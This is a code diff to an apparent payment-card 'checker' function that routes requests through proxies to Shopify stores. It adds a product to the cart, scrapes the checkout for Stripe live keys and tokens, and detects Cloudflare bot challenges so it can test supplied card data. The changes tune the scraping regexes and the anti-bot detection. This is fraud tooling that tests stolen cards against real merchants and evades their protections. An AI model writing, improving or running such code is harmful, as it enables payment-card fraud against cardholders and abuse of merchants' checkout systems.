@@ -98,7 +98,7 @@ async def check_shopify_direct(session, site_url, price, card_data, proxy):
     async with session.get(f"{base_url}/products.json?limit=1", headers=headers, proxy=proxy, timeout=15) as resp:
         if resp.status != 200: return "DECLINED", f"SITE_ERROR_{resp.status}"
         data = await resp.json(content_type=None)
-        if not data.get("products"): return "DECLINED", "NO_PRODUCTS"
+        if not data.get("products"): return "DECLINED", "NO_PRODUCTS_FOUND"
         variant_id = data["products"][0]["variants"][0]["id"]
 
     # 2. Add to Cart
@@ -107,19 +107,26 @@ async def check_shopify_direct(session, site_url, price, card_data, proxy):
         if resp.status != 200: return "DECLINED", "CART_ADD_FAILED"
 
     # 3. Scrape Checkout Page for Tokens
-    async with session.get(f"{base_url}/checkout", headers=headers, proxy=proxy, timeout=20, allow_redirects=True) as resp:
+    # We use allow_redirects=True to follow the chain to checkout.shopify.com
+    async with session.get(f"{base_url}/checkout", headers=headers, proxy=proxy, timeout=25, allow_redirects=True) as resp:
         html = await resp.text()
-        if "Just a moment" in html or "Checking your browser" in html:
+        
+        # Check for Cloudflare Anti-Bot protection
+        if "Just a moment" in html or "Checking your browser" in html or "cf-challenge" in html:
             return "DECLINED", "CLOUDFLARE_BLOCK"
             
-        match_pk = re.search(r'stripe_publishable_key["\']?\s*[:=]\s*["\']?(pk_live_[A-Za-z0-9]+)', html)
+        # Search for Stripe Publishable Key
+        match_pk = re.search(r'pk_live_[A-Za-z0-9]+', html)
+        # Search for Checkout Token
         match_token = re.search(r'checkout_token["\']?\s*[:=]\s*["\']?([a-f0-9]+)', html)
+        # Search for Authenticity Token
         match_auth = re.search(r'name=["\']authenticity_token["\']\s*value=["\']([^"\']+)', html)
         
+        # If we can't find the tokens, the checkout is unavailable or locked
         if not match_pk or not match_token:
             return "DECLINED", "CHECKOUT_UNAVAILABLE"
             
-        stripe_pk = match_pk.group(1)
+        stripe_pk = match_pk.group(0)
         checkout_token = match_token.group(1)
         auth_token = match_auth.group(1) if match_auth else ""
 
